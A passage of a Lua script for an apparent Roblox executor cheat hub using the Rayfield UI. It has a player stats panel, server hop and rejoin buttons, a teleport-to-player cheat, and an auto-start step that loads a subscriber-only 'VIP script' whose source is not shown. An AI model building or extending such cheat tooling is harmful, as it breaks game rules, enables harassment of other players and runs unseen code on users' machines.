    Title = "Your Stats",
    Content = "Loading analytics..."
})

local function updateAnalytics()
    local loginCount = (getDataStore("loginCount", 0) or 0) + 1
    setDataStore("loginCount", loginCount)
    local feedbackCount = getDataStore("feedbackCount", 0) or 0
    local vaultCredits = getDataStore("vaultCredits", 0) or 0
    local subStatus = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Active" or "Inactive"
    local scriptUsage = getDataStore("scriptUsageCount", 0) or 0
    local uptime = math.floor(tick() / 60) .. " min"
    local content = "User: " .. LocalPlayer.DisplayName .. " (ID: " .. playerInfo.UserId .. ")\n" ..
                    "Logins: " .. loginCount .. "\n" ..
                    "Feedback Sent: " .. feedbackCount .. "\n" ..
                    "Vault Credits: " .. vaultCredits .. "\n" ..
                    "Subscription: " .. subStatus .. "\n" ..
                    "Scripts Loaded: " .. scriptUsage .. "\n" ..
                    "Uptime: " .. uptime .. "\n" ..
                    "FPS: " .. playerInfo.FPS .. " | Ping: " .. playerInfo.Ping .. "\n" ..
                    "Membership: " .. playerInfo.MembershipType .. "\n" ..
                    "Friends: " .. playerInfo.FriendCount .. " | Followers: " .. playerInfo.FollowerCount .. "\n" ..
                    "Access: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\n" ..
                    "Last Login: " .. playerInfo.LastLogin
    analyticsParagraph:Set({Title = "Your Stats", Content = content})
end

spawn(function()
    wait(2)
    updateAnalytics()
end)

AnalyticsTab:CreateButton({
    Name = "Refresh Stats",
    Callback = function() 
        playerInfo = getPlayerInfo() -- Refresh dynamic data
        updateAnalytics() 
    end
})

AnalyticsTab:CreateButton({
    Name = "Share Stats",
    Callback = function()
        local stats = analyticsParagraph.Content
        setclipboard(stats)
        Rayfield:Notify({Title = "Copied", Content = "Stats copied to clipboard!", Duration = 5})
        challengeSystem:updateProgress("social_star")
    end
})

local ToolsTab = Window:CreateTab("Tools", 4483362458)
ToolsTab:CreateButton({
    Name = "Server Hop",
    Callback = function()
        Rayfield:Notify({Title = "Server Hop", Content = "Switching servers...", Duration = 3})
        local servers = game:GetService("TeleportService"):GetServerListAsync(game.PlaceId):GetCurrentPage()
        if #servers > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)].Id)
        else
            Rayfield:Notify({Title = "Error", Content = "No servers found!", Duration = 5})
        end
    end
})

ToolsTab:CreateButton({
    Name = "Rejoin Server",
    Callback = function()
        Rayfield:Notify({Title = "Rejoin", Content = "Rejoining current server...", Duration = 3})
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
    end
})

ToolsTab:CreateInput({
    Name = "Teleport to Player",
    PlaceholderText = "Enter player name...",
    Callback = function(targetName)
        local target = nil
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(targetName:lower()) or player.DisplayName:lower():find(targetName:lower()) then
                target = player
                break
            end
        end
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = target.Character.HumanoidRootPart.CFrame
            Rayfield:Notify({Title = "Teleport", Content = "Teleported to " .. target.DisplayName .. "!", Duration = 4})
        else
            Rayfield:Notify({Title = "Error", Content = "Player not found or no character!", Duration = 5})
        end
    end
})

if subscriptionSystem:isSubscribed(LocalPlayer.UserId) and getLocalStorage("autoUpdateEnabled", true) then
    spawn(function()
        wait(5)
        scriptSystem:loadScript(scriptSystem.vipScript, true)
        setDataStore("scriptUsageCount", (getDataStore("scriptUsageCount", 0) or 0) + 1)
    end)
end
